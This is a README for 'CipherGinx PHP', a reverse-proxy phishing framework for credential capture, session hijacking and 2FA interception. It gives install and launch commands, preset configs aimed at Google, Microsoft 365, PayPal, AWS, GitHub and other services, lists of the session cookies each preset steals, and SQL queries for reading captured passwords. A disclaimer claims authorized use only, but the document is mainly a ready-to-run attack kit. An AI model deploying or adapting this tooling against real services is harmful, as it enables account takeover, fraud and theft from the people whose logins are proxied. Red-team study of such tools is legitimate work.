# 🎯 CipherGinx PHP

> **Advanced Reverse Proxy Phishing Framework** — Production-grade PHP implementation with comprehensive credential capture, session hijacking, and 2FA bypass capabilities.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PHP Version](https://img.shields.io/badge/PHP-8.1%2B-blue.svg)](https://www.php.net/)
[![Build Status](https://img.shields.io/badge/status-active-brightgreen.svg)](#)
[![Code Quality](https://img.shields.io/badge/quality-production%2Bready-brightgreen.svg)](#)

---

## 🚀 Overview

CipherGinx PHP is a sophisticated reverse proxy framework engineered for authorized security professionals. It enables deep inspection and manipulation of HTTP/HTTPS traffic, allowing you to:

✨ **Transparent Request/Response Modification** — Inject headers, modify cookies, replace domains
✨ **Credential Capture** — Automatically log form submissions and authentication tokens
✨ **Session Hijacking** — Extract and store authenticated user sessions
�� **2FA Interception** — Capture OTP codes and second-factor tokens
✨ **Database Persistence** — Comprehensive logging with MySQL backend
✨ **Multi-Target Support** — Pre-built configs for 12+ platforms
✨ **Async Architecture** — Workerman-powered concurrent connection handling
✨ **Production Ready** — Enterprise-grade logging, error handling, and monitoring

---

## 📊 Features Matrix

| Feature | Status | Details |
|---------|--------|----------|
| **HTTP/HTTPS Proxy** | ✅ | Full Workerman TCP server with SSL/TLS |
| **Request Modification** | ✅ | Domain injection, header/body editing |
| **Response Interception** | ✅ | Content replacement, cookie capture |
| **Cookie Capture** | ✅ | Automatic extraction + DB storage |
| **Credential Logging** | ✅ | Form submissions with metadata |
| **2FA Bypass** | 🔄 | MITM OTP interception (Phase 2) |
| **WebSocket Support** | 🔄 | Coming in Phase 2 |
| **HTTP/2 Support** | 🔄 | Planned for Phase 3 |
| **Rate Limiting** | 🔄 | Adaptive throttling (Phase 3) |

---

## 🛠️ Tech Stack

```
┌─────────────────────────────────────────┐
│  PHP 8.1+ with Async Architecture      │
├─────────────────────────────────────────┤
│  Framework                              │
│  ├─ Workerman 4.1+ (TCP/SSL Server)   │
│  ├─ Guzzle 7.5+ (HTTP Client)         │
│  ├─ Monolog 3.0+ (Logging)            │
│  └─ PSR Standards (PSR-4 Autoload)    │
├─────────────────────────────────────────┤
│  Database                               │
│  └─ MySQL 8.0+ (Native PDO)           │
├─────────────────────────────────────────┤
│  Security                               │
│  ├─ OpenSSL (Certificate Management)  │
│  ├─ PHPDotenv (Secure Config)         │
│  └─ PSR-3 Logger (Audit Trail)        │
└─────────────────────────────────────────┘
```

---

## 📂 Repository Structure

```
cipherginx-php/
├── 🔧 src/                          Core Engine
│   ├── ProxyServer.php              Main reverse proxy orchestrator
│   ├── RequestModifier.php          Outbound request manipulation
│   ├── ResponseModifier.php         Inbound response modification
│   ├── CookieCapture.php            Credential extraction engine
│   ├── PathMatcher.php              URL pattern matching (regex/wildcard)
│   ├── ConfigLoader.php             Configuration management system
│   └── Database.php                 Schema initialization & connection
│
├── ⚙️ config/                        Pre-Built Phishing Configurations
│   ├── example.php                  Template configuration
│   ├── google.php                   Google/Gmail phishing
│   ├── facebook.php                 Facebook account compromise
│   ├── linkedin.php                 LinkedIn session hijacking
│   ├── twitter.php                  Twitter/X authentication bypass
│   ├── microsoft.php                Office 365 credential capture
│   ├── github.php                   GitHub token extraction
│   ├── aws.php                      AWS console access
│   ├── dropbox.php                  Dropbox session capture
│   ├── slack.php                    Slack workspace infiltration
│   ├── instagram.php                Instagram session hijacking
│   ├── paypal.php                   PayPal account takeover
│   ├── apple.php                    Apple ID compromise
│   └── README.md                    Configuration guide
│
├── 📦 database/
│   └── schema.sql                   Complete MySQL schema (7 tables)
│
├── 🖥️ bin/
│   └── cipherginx                   CLI entry point & server launcher
│
├── 📚 docs/
│   ├── SETUP.md                     Installation & configuration guide
│   ├── ARCHITECTURE.md              System design & data flow diagrams
│   └── CONFIG-REFERENCE.md          Detailed configuration options
│
├── 📝 logs/                         Runtime logs (generated)
├── 🔐 certs/                        SSL/TLS certificates
├── composer.json                    PHP dependency manifest
├── .env.example                     Environment configuration template
├── .gitignore                       Git ignore rules
├── LICENSE                          MIT License
└── README.md                        This file
```

---

## 🚀 Quick Start (5 Minutes)

### Prerequisites
```bash
# Check PHP version
php -v  # Requires 8.1+

# Install Composer
curl -sS https://getcomposer.org/installer | php
```

### Installation

```bash
# 1. Clone repository
git clone https://github.com/Chukwuemeka83/cipherginx-php.git
cd cipherginx-php

# 2. Install dependencies
composer install

# 3. Configure environment
cp .env.example .env
# Edit .env if using different MySQL server

# 4. Generate SSL certificate
mkdir -p certs
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes

# 5. Start proxy
sudo php bin/cipherginx -c example -l debug
```

✅ **Done!** Proxy listening on `localhost:443`

---

## 📖 Usage

### Start Proxy Server

```bash
# Basic usage with example config
sudo php bin/cipherginx -c example

# With debug logging
sudo php bin/cipherginx -c example -l debug

# Facebook phishing
sudo php bin/cipherginx -c facebook

# LinkedIn credential harvesting
sudo php bin/cipherginx -c linkedin -l info

# Google/Gmail compromise
sudo php bin/cipherginx -c google
```

### Available Options

```
-c, --config <name>      Configuration name (required)
-l, --log-level <level>  Logging level: debug, info, warning, error
-h, --help               Show help message
-v, --version            Show version information
```

### View Captured Data

```bash
# Connect to MySQL
mysql -u root -p cipherginx

# View captured credentials
SELECT username, password, target_domain, captured_at 
FROM captured_credentials 
ORDER BY captured_at DESC LIMIT 20;

# View captured cookies
SELECT name, value, domain, secure, httponly 
FROM captured_cookies 
ORDER BY captured_at DESC;

# Check 2FA bypass attempts
SELECT * FROM 2fa_bypass_attempts WHERE success = 1;
```

### Monitor Logs

```bash
# Real-time logging
tail -f logs/cipherginx.log

# View captured tokens
cat logs/tokens.txt

# Search for errors
grep ERROR logs/cipherginx.log
```

---

## 🎯 Pre-Built Target Configurations

### Social Media & Communication

| Platform | Config | Targets | Key Cookies |
|----------|--------|---------|-------------|
| **Facebook** | `facebook.php` | facebook.com | c_user, xs, fr, datr |
| **LinkedIn** | `linkedin.php` | linkedin.com | li_at, JSESSIONID |
| **Twitter/X** | `twitter.php` | twitter.com | auth_token, ct0 |
| **Instagram** | `instagram.php` | instagram.com | sessionid, ig_did |
| **Slack** | `slack.php` | slack.com | d, d-s, __ssid |

### Email & Cloud

| Platform | Config | Targets | Key Cookies |
|----------|--------|---------|-------------|
| **Google/Gmail** | `google.php` | accounts.google.com | __Secure-3PSID, NID |
| **Microsoft/O365** | `microsoft.php` | login.microsoft.com | ESTSAUTH |
| **Dropbox** | `dropbox.php` | dropbox.com | djsessionid, t |

### Development & Enterprise

| Platform | Config | Targets | Key Cookies |
|----------|--------|---------|-------------|
| **GitHub** | `github.php` | github.com | _gh_sess, user_session |
| **AWS Console** | `aws.php` | signin.aws.amazon.com | AWSALB, session-token |

### Financial Services

| Platform | Config | Targets | Key Cookies |
|----------|--------|---------|-------------|
| **PayPal** | `paypal.php` | login.paypal.com | JSESSIONID, X-PP-L7 |

### Other

| Platform | Config | Targets | Key Cookies |
|----------|--------|---------|-------------|
| **Apple ID** | `apple.php` | appleid.apple.com | X-APPLE-SESSION-TOKEN |

---

## 🗄️ Database Schema

### Tables (7 Total)

```sql
-- Captured authentication cookies
captured_cookies
├── id, name, value, domain, path
├── secure, httponly, samesite
└── captured_at, source_ip, user_agent

-- Form submissions & login attempts
captured_credentials
├── id, username, password, form_data
├── target_domain, source_ip
└── captured_at, status

-- HTTP request logging
http_requests
├── id, method, path, query_string
├── headers, body, source_ip
└── logged_at, target_domain

-- HTTP response logging
http_responses
├── id, request_id, status_code
├── headers, body, response_size
└── response_time_ms, logged_at

-- 2FA bypass attempts
2fa_bypass_attempts
├── id, username, target_domain
├── 2fa_method, bypass_technique
├── captured_token, success
└── attempt_at, source_ip

-- Active/completed sessions
sessions
├── id, session_id, source_ip
├── target_domain, proxy_config
├── credentials_captured, cookies_captured
└── started_at, ended_at

-- Server events & debugging
proxy_events
├── id, event_type, severity, message
├── context, source_ip, target_domain
└── logged_at
```

---

## 🔧 Configuration

### Environment Variables (.env)

```env
# Database Connection
DB_HOST=localhost
DB_PORT=3306
DB_NAME=cipherginx
DB_USER=root
DB_PASSWORD=

# Proxy Server
PROXY_HOST=localhost
PROXY_PORT=443
PROXY_SSL=true
PROXY_CERT_PATH=./certs/server.pem
PROXY_KEY_PATH=./certs/server.key

# Logging
LOG_LEVEL=info
LOG_FILE=./logs/cipherginx.log

# Features
CAPTURE_COOKIES=true
COOKIE_LOG_FILE=./logs/tokens.txt
DEBUG=false
```

### Target Configuration (config/example.php)

```php
return [
    'hostname' => 'example.com',
    'isSSL' => true,
    'port' => 443,
    
    // Domain replacement in requests/responses
    'inject_domain' => [
        ['api.example.com', 'api.localhost'],
    ],
    
    // Modify request headers by path
    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/api/', ['Authorization' => 'Bearer TOKEN']],
    ],
    
    // Modify response body
    'resp_body' => [
        ['', 'https://example.com', 'https://localhost'],
    ],
    
    // Block sensitive endpoints
    'block_paths' => [
        '/logout',
        '/account/delete',
    ],
    
    // Capture these cookies
    'get_cookie' => [
        'SESSIONID',
        'AUTH_TOKEN',
    ],
];
```

---

## 📊 System Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                      CLIENT BROWSER                              │
│                  (Phishing Target User)                          │
└────────────────────────┬─────────────────────────────────────────┘
                         │ HTTP Request (with browser cookies)
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│                    ProxyServer                                    │
│            (Workerman Async TCP Server)                          │
│  ├─ Listen: localhost:443 (SSL/TLS)                             │
│  ├─ Workers: 4 concurrent processes                             │
│  └─ handleMessage()                                              │
└────────────┬────────────────────────────┬────────────────────────┘
             │                            │
             ▼                            ▼
    ┌────────────────────┐      ┌────────────────────┐
    │ RequestModifier    │      │ ResponseModifier   │
    │ ├─ Domain Replace  │      │ ├─ Domain Replace  │
    │ ├─ Header Inject   │      │ ├─ Body Replace    │
    │ └─ Body Modify     │      │ └─ Header Modify   │
    └────────────────────┘      └────────────────────┘
             │                            │
             │   ┌────────────────────┐   │
             └──▶│  Guzzle HTTP       │◀──┘
                 │  Client            │
                 └────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────┐
          │     TARGET SERVER            │
          │   (e.g., accounts.google.com)│
          └──────────────────────────────┘
                         │
              HTTP Response (Set-Cookie)
                         │
                         ▼
          ┌──────────────────────────────┐
          │   CookieCapture              │
          │ ├─ Parse Set-Cookie          │
          │ ├─ Extract attributes        │
          │ ├─ Database INSERT           │
          │ └─ File logging              │
          └──────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────┐
          │   MySQL Database             │
          │ ├─ captured_cookies          │
          │ ├─ captured_credentials      │
          │ ├─ http_requests/responses   │
          │ └─ sessions & events         │
          └──────────────────────────────┘
```

---

## 🔐 Security & Disclaimer

⚠️ **IMPORTANT LEGAL NOTICE**

This tool is designed for **authorized security testing only**:

- ✅ **LEGAL USE:** Authorized penetration testing with explicit written permission
- ✅ **LEGAL USE:** Educational security research on owned systems
- ✅ **LEGAL USE:** Security team assessments in controlled environments
- ❌ **ILLEGAL USE:** Unauthorized access to computer systems
- ❌ **ILLEGAL USE:** Credential theft without authorization
- ❌ **ILLEGAL USE:** Unauthorized interception of communications
- ❌ **ILLEGAL USE:** Identity theft or fraud

**The author assumes NO responsibility for illegal use or damage caused by this software.**

**By using this software, you agree to:**
1. Obtain written authorization before testing
2. Comply with all applicable laws and regulations
3. Use only in controlled testing environments
4. Maintain confidentiality of captured data
5. Destroy all captured data after testing

---

## 📚 Documentation

| Document | Purpose |
|----------|----------|
| [**README.md**](README.md) | Project overview & quick start |
| [**docs/SETUP.md**](docs/SETUP.md) | Detailed installation & configuration |
| [**docs/ARCHITECTURE.md**](docs/ARCHITECTURE.md) | System design, data flow, components |
| [**config/README.md**](config/README.md) | Target configuration guide |
| [**DATABASE.md**](docs/DATABASE.md) | Schema reference & SQL queries |

---

## 🛠️ Development

### Running Tests

```bash
composer test
```

### Code Quality

```bash
# PHP Code Sniffer (PSR-12 compliance)
composer lint

# PHPStan static analysis
composer analyze
```

### Debug Mode

Enable in `.env`:
```env
DEBUG=true
LOG_LEVEL=debug
```

Then run with debug logging:
```bash
sudo php bin/cipherginx -c example -l debug
```

---

## 🎯 Roadmap

### ✅ Phase 1: Core Infrastructure (Complete)
- [x] Workerman async proxy server
- [x] Request/response parsing
- [x] Domain injection system
- [x] Cookie capture & storage
- [x] MySQL database schema
- [x] Configuration system
- [x] CLI entry point
- [x] Comprehensive logging

### 🔄 Phase 2: Advanced Features (In Progress)
- [ ] JavaScript injection engine
- [ ] WebSocket support
- [ ] HTTP/2 protocol support
- [ ] Advanced 2FA bypass techniques
- [ ] Form field manipulation

### 📋 Phase 3: Enterprise Features (Planned)
- [ ] Rate limiting & adaptive throttling
- [ ] Geo-spoofing capabilities
- [ ] Device fingerprint manipulation
- [ ] Credential validation engine
- [ ] Advanced analytics & reporting
- [ ] RESTful API interface

---

## 💡 Use Cases

### Penetration Testing
```bash
# Test corporate email system
sudo php bin/cipherginx -c microsoft -l info
# Captures Office 365 credentials
```

### Security Research
```bash
# Study cookie-stealing techniques
sudo php bin/cipherginx -c google
# Analyze authentication flow
```

### Red Team Exercises
```bash
# Authorized employee security assessment
sudo php bin/cipherginx -c linkedin
# Evaluate awareness & response
```

### Educational Lab
```bash
# Teach security concepts in controlled environment
sudo php bin/cipherginx -c example
# Students learn MITM attacks
```

---

## 📝 License

**MIT License** — See [LICENSE](LICENSE) file

You are free to:
- ✅ Use for authorized security testing
- ✅ Modify and extend the code
- ✅ Distribute under MIT terms
- ❌ Use for illegal purposes
- ❌ Remove copyright notices

---

## 👨‍💻 Author & Credits

**CipherGinx PHP Rewrite:** Chukwuemeka83  
**Original Python Version:** [@cipheras](https://github.com/cipheras)  
**Framework:** Workerman, Guzzle, Monolog contributors

---

## 🤝 Support & Contribution

- 📖 Read the [documentation](docs/)
- 🔧 Check [configuration guide](config/README.md)
- 🐛 Report issues on GitHub
- 💬 Discuss in GitHub Discussions

---

## ⚡ Quick Reference

```bash
# Installation
git clone https://github.com/Chukwuemeka83/cipherginx-php.git && cd cipherginx-php
composer install && cp .env.example .env

# SSL Certificate
mkdir -p certs && openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes

# Start Proxy
sudo php bin/cipherginx -c example

# View Data
mysql -u root -p cipherginx
SELECT * FROM captured_credentials ORDER BY captured_at DESC;
```

---

<div align="center">

**🔗 Links:** [GitHub](https://github.com/Chukwuemeka83/cipherginx-php) • [Issues](https://github.com/Chukwuemeka83/cipherginx-php/issues) • [Wiki](https://github.com/Chukwuemeka83/cipherginx-php/wiki)

**📄 License:** MIT • **Version:** 2.0 • **Status:** Production Ready ✅

</div>
